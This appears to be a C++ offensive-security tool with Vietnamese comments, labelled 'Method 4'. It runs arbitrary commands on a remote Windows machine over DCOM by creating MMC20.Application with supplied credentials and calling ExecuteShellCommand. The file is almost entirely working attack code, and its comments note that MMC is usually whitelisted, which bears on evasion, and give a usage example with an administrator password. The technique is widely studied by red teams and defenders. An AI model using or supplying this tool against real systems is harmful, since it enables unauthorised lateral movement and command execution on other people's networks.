// =============================================================================
// PHƯƠNG PHÁP 4: DCOM – MMC20.Application (ExecuteShellCommand)
// =============================================================================
// MMC20.Application là COM object của Microsoft Management Console.
// Document.ActiveView.ExecuteShellCommand() cho phép chạy command từ xa.
//
// Đây là kỹ thuật được nghiên cứu bởi Matt Nelson (@enigma0x3) năm 2017.
// MMC thường được whitelist vì là công cụ quản trị hợp lệ của Windows.
//
// CLSID: {49B2791A-B1AE-4C90-9B8E-E860BA07F889} = MMC20.Application
//
// Compile: cl mmc20_dcom.cpp /link ole32.lib oleaut32.lib
// Usage:   mmc20_dcom.exe <ip> <user> <pass> <command>
// =============================================================================

#define _WIN32_DCOM
#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <comdef.h>
#include <vector>
#include <objbase.h>
#include <iostream>
#include <string>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

void PrintCOMError(const wchar_t* msg, HRESULT hr) {
    _com_error err(hr);
    wprintf(L"[-] %s: 0x%08X (%s)\n", msg, hr, err.ErrorMessage());
}

// Helper: gọi method trên IDispatch bằng tên (late binding)
HRESULT InvokeMethod(
    IDispatch* pDisp,
    const wchar_t* methodName,
    VARIANT* pResult,
    int argCount, ...)
{
    DISPID dispid;
    BSTR bstrName = SysAllocString(methodName);
    HRESULT hr = pDisp->GetIDsOfNames(IID_NULL, &bstrName, 1,
        LOCALE_USER_DEFAULT, &dispid);
    SysFreeString(bstrName);
    if (FAILED(hr)) return hr;

    DISPPARAMS params = {};
    std::vector<VARIANT> args;

    if (argCount > 0) {
        args.resize(argCount);
        va_list vl;
        va_start(vl, argCount);
        // DISPPARAMS truyền args theo thứ tự NGƯỢC (last arg first)
        for (int i = argCount - 1; i >= 0; i--) {
            VariantInit(&args[i]);
            VARIANT* pv = va_arg(vl, VARIANT*);
            VariantCopy(&args[i], pv);
        }
        va_end(vl);
        params.rgvarg = args.data();
        params.cArgs = argCount;
        params.cNamedArgs = 0;
    }

    EXCEPINFO excep = {};
    hr = pDisp->Invoke(dispid, IID_NULL, LOCALE_USER_DEFAULT,
        DISPATCH_METHOD, &params, pResult, &excep, NULL);

    for (auto& v : args) VariantClear(&v);
    return hr;
}

// Helper: lấy property từ IDispatch
HRESULT GetProperty(IDispatch* pDisp, const wchar_t* propName, VARIANT* pResult) {
    DISPID dispid;
    BSTR bstrName = SysAllocString(propName);
    HRESULT hr = pDisp->GetIDsOfNames(IID_NULL, &bstrName, 1,
        LOCALE_USER_DEFAULT, &dispid);
    SysFreeString(bstrName);
    if (FAILED(hr)) return hr;

    DISPPARAMS params = {};
    return pDisp->Invoke(dispid, IID_NULL, LOCALE_USER_DEFAULT,
        DISPATCH_PROPERTYGET, &params, pResult, NULL, NULL);
}

#include <vector>

int wmain(int argc, wchar_t* argv[])
{
    if (argc < 5) {
        wprintf(L"Usage: mmc20_dcom <ip> <username> <password> <command>\n");
        wprintf(L"Example: mmc20_dcom 192.168.1.10 Administrator P@ss cmd.exe\n");
        wprintf(L"Note: ExecuteShellCommand takes exe only (no args in this method)\n");
        return 1;
    }

    std::wstring targetIP = argv[1];
    std::wstring username = argv[2];
    std::wstring password = argv[3];
    std::wstring command = argv[4];  // Nên là full path: C:\Windows\System32\cmd.exe

    HRESULT hr;

    // ── 1. Init COM ──────────────────────────────────────────────────────────
    hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) { PrintCOMError(L"CoInitializeEx", hr); return 1; }

    hr = CoInitializeSecurity(NULL, -1, NULL, NULL,
        RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IDENTIFY,
        NULL, EOAC_NONE, NULL);
    if (FAILED(hr) && hr != RPC_E_TOO_LATE)
        PrintCOMError(L"CoInitializeSecurity (non-fatal)", hr);

    // ── 2. Chuẩn bị COSERVERINFO và COAUTHIDENTITY ───────────────────────────
    COAUTHIDENTITY authIdent = {};
    authIdent.User = (USHORT*)username.c_str();
    authIdent.UserLength = (ULONG)username.size();
    authIdent.Password = (USHORT*)password.c_str();
    authIdent.PasswordLength = (ULONG)password.size();
    authIdent.Domain = (USHORT*)L"";
    authIdent.DomainLength = 0;
    authIdent.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;

    COAUTHINFO authInfo = {};
    authInfo.dwAuthnSvc = RPC_C_AUTHN_WINNT;
    authInfo.dwAuthzSvc = RPC_C_AUTHZ_NONE;
    authInfo.pwszServerPrincName = NULL;
    authInfo.dwAuthnLevel = RPC_C_AUTHN_LEVEL_PKT_PRIVACY;
    authInfo.dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
    authInfo.pAuthIdentityData = &authIdent;
    authInfo.dwCapabilities = EOAC_NONE;

    COSERVERINFO serverInfo = {};
    serverInfo.pwszName = (LPWSTR)targetIP.c_str();
    serverInfo.pAuthInfo = &authInfo;

    // ── 3. CoCreateInstanceEx với CLSID_MMC20 ────────────────────────────────
    //
    // CLSID MMC20.Application: {49B2791A-B1AE-4C90-9B8E-E860BA07F889}
    // Đây là ProgID "MMC20.Application" – Microsoft Management Console.
    // Ta tạo instance trực tiếp trên remote machine qua DCOM.
    //
    // MMC20 expose IDispatch (scripting interface) nên ta dùng late binding
    // thay vì early binding (không cần MMC header/typelib).
    //
    const CLSID CLSID_MMC20 = {
        0x49B2791A, 0xB1AE, 0x4C90,
        {0x9B, 0x8E, 0xE8, 0x60, 0xBA, 0x07, 0xF8, 0x89}
    };

    MULTI_QI mqi = {};
    mqi.pIID = &IID_IDispatch;

    hr = CoCreateInstanceEx(
        CLSID_MMC20,
        NULL,
        CLSCTX_REMOTE_SERVER,
        &serverInfo,
        1,
        &mqi
    );

    if (FAILED(hr) || FAILED(mqi.hr)) {
        PrintCOMError(L"CoCreateInstanceEx(MMC20)", FAILED(hr) ? hr : mqi.hr);
        CoUninitialize();
        return 1;
    }
    wprintf(L"[+] MMC20.Application instantiated on %s\n", targetIP.c_str());

    IDispatch* pMMC = (IDispatch*)mqi.pItf;

    // ── 4. Set proxy blanket với credential ──────────────────────────────────
    SEC_WINNT_AUTH_IDENTITY_W secIdent = {};
    secIdent.User = (USHORT*)username.c_str();
    secIdent.UserLength = (ULONG)username.size();
    secIdent.Password = (USHORT*)password.c_str();
    secIdent.PasswordLength = (ULONG)password.size();
    secIdent.Domain = (USHORT*)L"";
    secIdent.DomainLength = 0;
    secIdent.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;

    hr = CoSetProxyBlanket(pMMC,
        RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        &secIdent, EOAC_NONE);
    if (FAILED(hr)) PrintCOMError(L"CoSetProxyBlanket (non-fatal)", hr);

    // ── 5. Lấy Document property: pMMC.Document ──────────────────────────────
    //
    // MMC20 object model:
    //   MMC20.Application
    //     └── .Document          (MMC Document)
    //           └── .ActiveView  (Active View trong MMC)
    //                 └── .ExecuteShellCommand(cmd, dir, params, windowState)
    //
    VARIANT vDoc;
    VariantInit(&vDoc);
    hr = GetProperty(pMMC, L"Document", &vDoc);
    if (FAILED(hr) || vDoc.vt != VT_DISPATCH || !vDoc.pdispVal) {
        PrintCOMError(L"Get MMC.Document", hr);
        pMMC->Release();
        CoUninitialize();
        return 1;
    }
    IDispatch* pDoc = vDoc.pdispVal;
    wprintf(L"[+] Got MMC Document object\n");

    // Set proxy blanket cho Document interface
    CoSetProxyBlanket(pDoc,
        RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        &secIdent, EOAC_NONE);

    // ── 6. Lấy ActiveView property: pDoc.ActiveView ───────────────────────────
    VARIANT vView;
    VariantInit(&vView);
    hr = GetProperty(pDoc, L"ActiveView", &vView);
    if (FAILED(hr) || vView.vt != VT_DISPATCH || !vView.pdispVal) {
        PrintCOMError(L"Get Document.ActiveView", hr);
        pDoc->Release();
        VariantClear(&vDoc);
        pMMC->Release();
        CoUninitialize();
        return 1;
    }
    IDispatch* pView = vView.pdispVal;
    wprintf(L"[+] Got MMC ActiveView object\n");

    // Set proxy blanket cho View interface
    CoSetProxyBlanket(pView,
        RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        &secIdent, EOAC_NONE);

    // ── 7. Gọi ExecuteShellCommand ────────────────────────────────────────────
    //
    // ExecuteShellCommand(Command, Directory, Parameters, WindowState)
    //   - Command    : executable path
    //   - Directory  : working directory
    //   - Parameters : command line arguments
    //   - WindowState: "Minimized" | "Maximized" | "Normal"
    //
    // Ví dụ: ExecuteShellCommand("cmd.exe", "C:\", "/c whoami > C:\out.txt", "Minimized")
    //
    std::wstring exe, params;
    size_t spacePos = command.find(L' ');
    if (spacePos != std::wstring::npos) {
        exe = command.substr(0, spacePos);
        params = command.substr(spacePos + 1);
    }
    else {
        exe = command;
    }

    VARIANT vCmd, vDir, vParams, vWindow;
    VariantInit(&vCmd);    VariantInit(&vDir);
    VariantInit(&vParams); VariantInit(&vWindow);

    vCmd.vt = VT_BSTR; vCmd.bstrVal = SysAllocString(exe.c_str());
    vDir.vt = VT_BSTR; vDir.bstrVal = SysAllocString(L"C:\\");
    vParams.vt = VT_BSTR; vParams.bstrVal = SysAllocString(params.c_str());
    vWindow.vt = VT_BSTR; vWindow.bstrVal = SysAllocString(L"Minimized");

    VARIANT vResult;
    VariantInit(&vResult);

    // Gọi method bằng Invoke với 4 tham số
    // DISPPARAMS args theo thứ tự NGƯỢC (DCOM/COM convention)
    VARIANT invokeArgs[4];
    VariantInit(&invokeArgs[0]); VariantInit(&invokeArgs[1]);
    VariantInit(&invokeArgs[2]); VariantInit(&invokeArgs[3]);
    VariantCopy(&invokeArgs[0], &vWindow);  // arg 4 (window) → index 0
    VariantCopy(&invokeArgs[1], &vParams);  // arg 3 (params) → index 1
    VariantCopy(&invokeArgs[2], &vDir);     // arg 2 (dir)    → index 2
    VariantCopy(&invokeArgs[3], &vCmd);     // arg 1 (cmd)    → index 3

    DISPID dispid;
    BSTR bstrMethod = SysAllocString(L"ExecuteShellCommand");
    hr = pView->GetIDsOfNames(IID_NULL, &bstrMethod, 1,
        LOCALE_USER_DEFAULT, &dispid);
    SysFreeString(bstrMethod);

    if (SUCCEEDED(hr)) {
        DISPPARAMS invokeParams = {};
        invokeParams.rgvarg = invokeArgs;
        invokeParams.cArgs = 4;
        invokeParams.cNamedArgs = 0;

        EXCEPINFO excep = {};
        hr = pView->Invoke(dispid, IID_NULL, LOCALE_USER_DEFAULT,
            DISPATCH_METHOD, &invokeParams,
            &vResult, &excep, NULL);
        if (SUCCEEDED(hr)) {
            wprintf(L"[+] ExecuteShellCommand succeeded!\n");
            wprintf(L"    Exe   : %s\n", exe.c_str());
            wprintf(L"    Params: %s\n", params.c_str());
        }
        else {
            PrintCOMError(L"ExecuteShellCommand.Invoke", hr);
        }
    }
    else {
        PrintCOMError(L"GetIDsOfNames(ExecuteShellCommand)", hr);
    }

    // ── Cleanup ──────────────────────────────────────────────────────────────
    for (int i = 0; i < 4; i++) VariantClear(&invokeArgs[i]);
    VariantClear(&vCmd); VariantClear(&vDir);
    VariantClear(&vParams); VariantClear(&vWindow);
    VariantClear(&vResult);

    pView->Release();
    VariantClear(&vView);
    pDoc->Release();
    VariantClear(&vDoc);
    pMMC->Release();
    CoUninitialize();

    return SUCCEEDED(hr) ? 0 : 1;
}